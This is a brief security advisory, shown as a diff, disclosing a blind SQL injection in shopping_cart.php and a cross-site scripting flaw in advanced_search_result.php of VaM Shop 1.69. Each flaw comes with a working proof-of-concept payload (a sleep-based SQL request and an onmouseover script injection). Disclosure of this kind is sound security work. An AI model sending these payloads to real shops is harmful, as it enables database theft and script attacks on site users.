@@ -1,0 +1,20 @@
+Product: VaM Shop
+Vendor: Vamsoft ( http://vamshop.ru/ ) 
+Vulnerable Version: 1,69 and probably prior versions.
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High
+Credit: Security Effect Team(http://seceffect.tumblr.com/)
+
+
+Vulnerability Details:
+1. Blind SQL injection in shopping_cart.php in parameter product_id[]. 
+PoC: 
+POST /shopping_cart.php?action=update_product
+
+cart_delete[]=2071&cart_quantity[]=1&old_qty[]=1&products_id[]=2071' and sleep(2)%3d%27
+
+2. Multiple XSS(cross-site scripting).
+PoC:
+/advanced_search_result.php/o" onmouseover=prompt(123) //
+
+Copyright (c) 2012. Security Effect.
